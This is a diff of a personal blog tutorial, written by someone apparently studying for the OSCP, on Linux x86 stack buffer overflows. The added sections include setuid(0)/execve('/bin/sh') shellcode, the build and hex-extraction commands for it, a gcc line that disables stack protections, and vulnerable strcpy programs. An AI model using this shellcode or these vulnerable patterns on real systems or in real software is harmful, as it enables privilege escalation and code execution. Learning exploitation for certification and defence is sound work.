@@ -396,11 +396,11 @@
      data-full-width-responsive="true"></ins>
 
   <div class="post-body">
-    <p>If you follow up my lastest post, you can see that it’s being long time since I upload my latest post here, and you may know that I am working and learning for the <strong>OSCP</strong> exam, which is the ultimate certification in my case. One of the attacks that I have learn on that path and exciting me much, so much so that it gives me chills, is <strong>buffer overflow</strong> attack. I have seeing many attacks, from the application level to the low level, which is called also the infrastructure level, in my case I have found my self more enjoyable by learning buffer overflow, and after I finish my first attack on that low memory, I finally recognized what I really what to do on the cyber security field, which is to be cyber security researcher, which mean, among to the others, to know how to analysis malware and viruses, how to track their actions, and understand what they design to do.</p>
+    <p>If you follow up my latest post, you can see that it’s being long time since I upload my latest post here, and you may know that I am working on and preparing to the <strong>OSCP</strong> exam, which is the ultimate certification in my case. One of the attacks that I have learn on that path and exciting me much, so much so that it gives me chills, is <strong>buffer overflow</strong> attack. I have seeing many attacks, from the application level to the low level, which is called also the infrastructure level, in my case I have found my self more enjoyable by learning buffer overflow, and after I finish my first attack on that low memory, I finally recognized what I really what to do on the cyber security field is to be cyber security researcher, which mean, among to the others, to know how to analysis malware and viruses, how to track their actions, and understand what they design to do, if you search about that on linkedin, you should find research type of jobs that include reverse engineering.</p>
 
-<p>If you ask my Mentor, Sagi Kedmi, about that, I am sure that he will be say “you need to be the developer yourself, let the other read you garbage logs”. I can say that I undestand that, but after I develop my last two React-Native apps, I was many time frastrated, then the path I have done untill I have brack my first program in low memory level, the path was so much fun and I learn a lot, so I guess that is better for me to go to that field, the malware researcher.</p>
+<p>If you ask my Mentor, Sagi Kedmi, about that, I am sure that he will be say “you need to be the developer yourself, let the other read you garbage logs”. I can say that I understand that, but after I develop my last two React-Native Apps, I was many time frustrated. On the other hand the path I have done until I have break my first program in low memory level, was so much fun and I learn a lot, so I guess that is better for me to go to that field, the malware researcher and reverse engineer.</p>
 
-<p>Let’s brack it done, this post agenda are:</p>
+<p>Let’s track it done, this post agenda are:</p>
 <ul>
   <li><a href="#understand-the-theoretical">Understand the theoretical</a></li>
   <li><a href="#debugging-tools-and-how-to-use-them">Debugging tools and how to use them</a></li>
@@ -409,20 +409,20 @@
 
 <h2 id="understand-the-theoretical">Understand the theoretical</h2>
 
-<p>Buffer overflow is much like other app attack, like, we enumerate the app and search for brack point which can be use later to bring some reverse shell or do other thing to gain sort of access to the server side if you will. In buffer overflow is much the same, we enumerate the program in low memory and search for injection point, is more complicated then just find the point and inject the code, but the way to find it include the two steps as in the application injection point:</p>
+<p>Buffer overflow is much like other app attack, like, we enumerate the app and search for break point which can be use later to bring some reverse shell or do other thing to gain sort of access to the server side if you will. In buffer overflow is much the same, we enumerate the program in low memory and search for injection point. This is more complicated then just find the point and inject the code, but the way to find it include the two steps as in the application injection point:</p>
 
 <ol>
   <li>Full Enumeration.</li>
   <li>Pre-Exploit Injection.</li>
-  <li>Explotation.</li>
+  <li>Exploitation.</li>
 </ol>
 
-<p>First let’s understand in the eazy way how it work, it much like a bucket, if you have a bucket you shorly know how much water you can insert to it, if you insert more than the bucket can contains, the water will flow out the bucket, and that what happens on buffer overflow. We have a memory space that contain data, and we insert more data than the <strong>memory segment</strong> can contain.</p>
+<p>First let’s understand in the eazy way how it work, it much like a bucket, if you have a bucket you surely know how much water you can insert to it, if you insert more than the bucket can contains, the water will flow out the bucket, and that what happens on buffer overflow. We have a memory space that contain data, and we insert more data than the <strong>memory segment</strong> can contain.</p>
 
 <p><img src="/assets/images/bo-001.jpg" alt="bo-001.png" />
 <strong>Figure 1</strong> Flow the bucket.</p>
 
-<p>The problem that the buffer overflow made is not just flow out the memory segment, it flow out with new instruction which in some way make the program do fllow them and execute the new instruction like they are part of the program it self, you can think of it like someone give some laboratory guy instuction to do X and Y and Z, and he does, but in some point the instuction was change by another person without the laboratory guy notice and after he have ran them he get’s other reactions that he expected to see.</p>
+<p>The problem that the buffer overflow made is not just flow out the memory segment, it flow out with new instruction which in some way make the program to execute the new instruction like they are part of the program it self, you can think of it like someone give some laboratory guide instruction to do X and Y and Z, and he does, but in some point the instruction was change by another person without the laboratory guy notice and after he have ran them he gets other reactions that he expected to see.</p>
 
 <p><img src="/assets/images/bo-002.jpg" alt="bo-002.png" />
 <strong>Figure 2</strong> laboratory explosion.</p>
@@ -445,7 +445,7 @@
   <li>In a 64-bit system: 0x0000000000000000 to 0xFFFFFFFFFFFFFFFF</li>
 </ul>
 
-<p>Just remember that each virtual addresses are used as references to locations in the program’s memory, including code, data, and other segments. The stack segment in a program’s virtual address space does, in a sense, point directly to the addresses that are involved in the program’s execution flow. The stack is a Last In, First Out (LIFO) data structure that is used for managing function calls, local variables, and the program’s execution flow.</p>
+<p>Just remember that each virtual addresses are used as references to locations in the program’s memory, including code, data, and other segments. The stack segment in a program’s virtual address space does, in a sense, point directly to the addresses that are involved in the program’s execution flow. The stack is a Last In - First Out (LIFO) data structure that is used for managing function calls, local variables, and the program’s execution flow.</p>
 
 <p>And this is the point on our case that we must to understand, since we aim to overflow the memory, overwriting the stack and gaining control, we can manipulate it by overwriting it with a virtual address pointing to our malicious code, allowing us to execute it.</p>
 
@@ -457,10 +457,9 @@
 
 <p><strong>Memory Segments:</strong> The memory is divided into segments like the code segment (for executable instructions), data segment (for global variables), heap (for dynamic memory), and stack (for managing function calls and local variables).</p>
 
-<p><strong>CPU Registers:</strong> The CPU, the brain of the computer, has special storage locations called registers.
-General-purpose registers like EAX, EBX are used for quick data storage and manipulation.</p>
+<p><strong>CPU Registers:</strong> The CPU, the brain of the computer, has special storage locations called registers. General-purpose registers like EAX, EBX are used for quick data storage and manipulation.</p>
 
-<p><strong>Instruction Fetch:</strong> The CPU fetches instructions from the code segment in memory, and the program counter (a special register, the <em>Instruction Pointer</em>) keeps track of the next instruction to be executed.</p>
+<p><strong>Instruction Fetch:</strong> The CPU fetches instructions from the code segment in memory, and the program counter (a special register, the <strong>IP</strong> - <em>Instruction Pointer</em>) keeps track of the next instruction to be executed.</p>
 
 <p><strong>Instruction Decode and Execute:</strong> The CPU decodes the fetched instruction and performs the corresponding operation. This could be arithmetic, logic, or control-flow operations.</p>
 
@@ -487,7 +486,74 @@ General-purpose registers like EAX, EBX are used for quick data storage and mani
 
 <p>We can find several debugging tool, since we talk about linux, we going to check the debugging tool that fit for linux. In our case we going to use GDB (GNU Debugger), but also you can use another tools, for example, Valgrind, strace, ltrace, gdbserver, perf, rr (Mozilla’s Record and Replay), Various strace and ltrace GUIs (Graphical User Interfaces).</p>
 
-<p>First, let’s look on our first code, the following code is the vulnerable for buffer overflow since the buffer size have no boundaries.</p>
+<p>Also, you can find <strong>Ghidra</strong> which can help a lot on reverse some binary and understand the code, but we will talk about it on another post.</p>
+
+<p>Before we going to dive into the first code, on the follows examples we going to use some shellcode, so we will create buffer overflow and run our malicious code so we should get back new shell from our execution.</p>
+
+<p>The following shell code I found over exploit db, which is 13333.txt:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/blackorbird/exploit-database/blob/master/shellcodes/lin_x86/13333.txt
+</code></pre></div></div>
+
+<p>First we going to compile that code and make some binary files of it, after that we will create hex values so we can use it as the malicious part on our buffer overflow.</p>
+
+<p>The original code look like the following:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>;shellcode.asm
+global _start
+section .text
+_start:
+  ;setuid(0)
+  xor ebx,ebx
+  lea eax,[ebx+17h]
+  cdq
+  int 80h
+  ;execve("/bin/sh",0,0)
+  xor ecx,ecx
+  push ecx
+  push 0x68732f6e
+  push 0x69622f2f
+  lea eax,[ecx+0Bh]
+  mov ebx,esp
+  int 80h
+</code></pre></div></div>
+
+<p>That code should be save as shellcode.asm, then we use the following code for change it’s format to elf file so we can make it as binary file:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nasm -f elf32 -o shellcode.o shellcode.asm
+</code></pre></div></div>
+
+<p>Now, we going to links the object file “shellcode.o” into an executable binary named “shellcode” using the GNU Linker. The resulting binary is a 32-bit ELF executable that can be executed on a compatible system.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ld -m elf_i386 -o shellcode shellcode.o
+</code></pre></div></div>
+
+<p>We can check now it if work and give us new shell on our terminal:
+<img src="/assets/images/shell01.png" alt="shell01.png" />
+<strong>Figure 4</strong> New shell on our terminal.</p>
+
+<p>Now, we want to convert that binary to hex value so we can use it on   the buffer overflow example here. We going to use the command objcopy to extract the binary content of the <em>.text</em> section from the input file “shellcode” and saves it into a new file named “shellcode.bin”. This is often done to extract the raw machine code (binary) from an executable or object file, which can be useful for various purposes such as embedding in other programs or systems.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bjcopy -O binary -j .text shellcode shellcode.bin
+</code></pre></div></div>
+
+<p>Now with the next command we going to convert the binary content of “shellcode.bin” into a format commonly used in shellcode or other contexts where raw hexadecimal representation is needed. The output will be a series of <code class="highlighter-rouge">\x</code> prefixed hexadecimal values representing each byte in the binary file.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xxd -p -c 1 shellcode.bin | awk '{printf("\\x%s", $1)}'\n
+</code></pre></div></div>
+
+<p>the output of that should be our hex shell code values that we need to our buffer overflow example:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80
+</code></pre></div></div>
+
+<p>Also we need to know the length of our shellcode so we can use it for our calculation:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash</span>
+
+<span class="nv">shellcode</span><span class="o">=</span><span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">17</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
+
+<span class="c"># Remove the escape characters and calculate the length</span>
+<span class="nv">length</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="nt">-e</span> <span class="nv">$shellcode</span> | <span class="nb">wc</span> <span class="nt">-c</span><span class="k">)</span>
+
+<span class="nb">echo</span> <span class="s2">"Length of shellcode: </span><span class="nv">$length</span><span class="s2"> bytes"</span></code></pre></figure>
+
+<p>The output for that one is:<code class="highlighter-rouge">Length of shellcode: 28 bytes</code>.</p>
+
+<p>So now we can start on our first example, let’s look on our first code, the following code is the vulnerable for buffer overflow since the buffer size have no boundaries.</p>
 
 <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdio.h&gt;
 #include &lt;string.h&gt;
@@ -517,7 +583,11 @@ General-purpose registers like EAX, EBX are used for quick data storage and mani
 
 <p>The line <code class="highlighter-rouge">char buffer[500];</code> declares a character array named buffer with a size of 500 bytes. The line <code class="highlighter-rouge">strcpy(buffer, argv[1]);</code> are used to take the user input on argv[1] and store it on the buffer that was create earlier . In the  end of the code  it return 0, which mean no output should appear on the screen.</p>
 
-<p>This code are vulnerable for buffer overflow because, althou There is size for the buffer, there is no checking how much data what insert on argv[1], so, if there is more then 500 characters on argv[1] it insert it to buffer which should contain only 500, which mean the pieces of data that was inserted are overwrite other field with can overwrite the instructions and take doen the program or the binary file on our case.</p>
+<p>This code are vulnerable for buffer overflow because, although there is size for the buffer, there is no checking how much data was insert on argv[1], so, if there is more then 500 characters on argv[1] it insert it to buffer which should contain only 500, which mean the pieces of data that was inserted are overwrite other field which can overwrite the instructions and take down the program or the binary file on our case.</p>
+
+<p>Now, lets compile that code:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -fno-stack-protector -z execstack -m32 -no-pie vuln1.c -o vuln1
+</code></pre></div></div>
 
 <p>so now, let’s look on that closely, we run gdb for debug that code using:</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;gdb ./vuln1
@@ -640,7 +710,20 @@ Program received signal SIGSEGV, Segmentation fault.
 <p>Now we can see that EBP is only partly overwrite with our <code class="highlighter-rouge">\x41</code>, which mean for fill it up we need to use 512 characters on our input and that’s it, we can control the EBP now.</p>
 
 <p><img src="/assets/images/bo-012.png" alt="bo-012.png" />
-<strong>Figure 12</strong> Control the EBP..</p>
+<strong>Figure 12</strong> Control the EBP.</p>
+
+<p>#include <stdio.h>
+#include <string.h>
+void secret(){
+  printf("You have accessed the secret function!!\n");
+}
+int main(int argc, char *argv[])
+{
+  char buf[512];
+  strcpy(buf, argv[1]);
+  printf("%s",buf);
+  return(0);
+}</string.h></stdio.h></p>
 
     
 
